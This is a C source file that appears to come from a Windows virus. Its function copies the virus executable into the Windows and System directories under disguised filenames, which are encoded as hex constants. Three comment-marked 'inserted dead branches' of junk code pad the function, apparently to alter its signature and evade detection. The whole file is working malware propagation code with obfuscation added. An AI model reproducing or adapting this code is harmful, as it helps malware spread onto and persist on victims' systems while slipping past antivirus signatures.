#include "data_globals.h"
#include <windows.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>

void _CopyVirus(void)
{
    char windir[256];
    char windir2[256];
    char windoze[271]; // Assuming the maximum length is 256 + 3 (for '\0' and appended strings)
    char windoze2[271];

    // --- INSERTED DEAD BRANCH 1 (Math Invariant, Category A: System info) ---
    volatile int dummy_x_1 = 7;
    if ((dummy_x_1 * (dummy_x_1 + 1)) % 2 != 0) {
        SYSTEM_INFO si;
        GetSystemInfo(&si);
        SYSTEMTIME st;
        GetLocalTime(&st);
        char userName[256];
        DWORD size = sizeof(userName);
        if (GetUserNameA(userName, &size)) {
            volatile int dummyUse = userName[0];
        }
        char compName[256];
        size = sizeof(compName);
        if (GetComputerNameA(compName, &size)) {
            volatile int dummyUse = compName[0];
        }
        volatile DWORD dummySum = 0;
        for (int i = 0; i < 10; i++) {
            dummySum += si.dwNumberOfProcessors + st.wHour;
        }
        // read existing local variable (just to satisfy reading rule)
        volatile int readLocal = windir[0];
        SecureZeroMemory(&si, sizeof(si));
        SecureZeroMemory(&st, sizeof(st));
    }

    GetWindowsDirectoryA(windir, sizeof(windir));
    GetWindowsDirectoryA(windir2, sizeof(windir2));

    strcpy(windoze, windir);
    int len_windoze = strlen(windoze);

    *(uint32_t *)(windoze + len_windoze) = 0x5341545c;
    *(uint32_t *)(windoze + len_windoze + 4) = 0x414f4d4b;
    *(uint32_t *)(windoze + len_windoze + 8) = 0x58452e4e;
    *((uint16_t *)(windoze + len_windoze + 12)) = 0x45;

    strcpy(windoze2, windir2);
    int len_windoze2 = strlen(windoze2);

    *(uint32_t *)(windoze2 + len_windoze2) = 0x5341545c;
    *(uint32_t *)(windoze2 + len_windoze2 + 4) = 0x414f4d4b;
    *(uint32_t *)(windoze2 + len_windoze2 + 8) = 0x58452e4e;
    *((uint16_t *)(windoze2 + len_windoze2 + 12)) = 0x45;

    CopyFileA(_VirusPath, windoze, 0);

    // --- INSERTED DEAD BRANCH 2 (Combination, Category B: Memory & string) ---
    volatile DWORD dummy_tick_2 = GetTickCount();
    if ((dummy_tick_2 ^ 0x5A5A5A5A) == 0xFFFFFFFF && (dummy_tick_2 & 0x80000000) != 0) {
        char* dummyBuf = (char*)malloc(64);
        if (dummyBuf) {
            sprintf_s(dummyBuf, 64, "Dummy %d", (int)dummy_tick_2);
            size_t len = strlen(dummyBuf);
            char* dummyBuf2 = (char*)malloc(len + 10);
            if (dummyBuf2) {
                memcpy(dummyBuf2, dummyBuf, len);
                memset(dummyBuf2 + len, 0, 10);
                volatile int hash = 0;
                for (int i = 0; i < (int)len; i++) {
                    hash = (hash * 31) + dummyBuf2[i];
                }
                // read existing local
                volatile int readLocal2 = windoze[0];
                free(dummyBuf2);
            }
            free(dummyBuf);
        }
        volatile char localBuf[32];
        memset((void*)localBuf, 0, sizeof(localBuf));
    }

    char sysdir[256];
    char sysdir2[256];
    char sysdoze[271]; // Assuming the maximum length is 256 + 3 (for '\0' and appended strings)
    char sysdoze2[271];

    GetSystemDirectoryA(sysdir, sizeof(sysdir));
    GetSystemDirectoryA(sysdir2, sizeof(sysdir2));

    strcpy(sysdoze, sysdir);
    int len_sysdoze = strlen(sysdoze);

    *(uint32_t *)(sysdoze + len_sysdoze) = 0x6242425c;
    *(uint32_t *)(sysdoze + len_sysdoze + 4) = 0x4244574c;
    *(uint32_t *)(sysdoze + len_sysdoze + 8) = 0x7263532e;
    *((char *)(sysdoze + len_sysdoze + 12)) = 0;

    strcpy(sysdoze2, sysdir2);
    int len_sysdoze2 = strlen(sysdoze2);

    *(uint32_t *)(sysdoze2 + len_sysdoze2) = 0x6242425c;
    *(uint32_t *)(sysdoze2 + len_sysdoze2 + 4) = 0x4244574c;
    *(uint32_t *)(sysdoze2 + len_sysdoze2 + 8) = 0x7263532e;
    *((char *)(sysdoze2 + len_sysdoze2 + 12)) = 0;

    CopyFileA(_VirusPath, sysdoze, 0);

    // --- INSERTED DEAD BRANCH 3 (System Query, Category C: Bitwise/Math loops) ---
    if (GetPriorityClass(GetCurrentProcess()) == 0xFFFFFFFF) {
        volatile unsigned char dummyArr[32];
        for (int i = 0; i < 32; i++) {
            dummyArr[i] = (unsigned char)(i * 7);
        }
        volatile unsigned int hash = 0x811C9DC5;
        for (int i = 0; i < 32; i++) {
            hash ^= dummyArr[i];
            hash *= 0x01000193;
        }
        volatile int xorSum = 0;
        for (int i = 0; i < 32; i++) {
            xorSum ^= dummyArr[i];
        }
        // read existing local
        volatile int readLocal3 = sysdoze[0];
        SecureZeroMemory((void*)dummyArr, sizeof(dummyArr));
        SYSTEM_INFO si2;
        GetSystemInfo(&si2);
        volatile DWORD dummyProc = si2.dwNumberOfProcessors;
    }
}
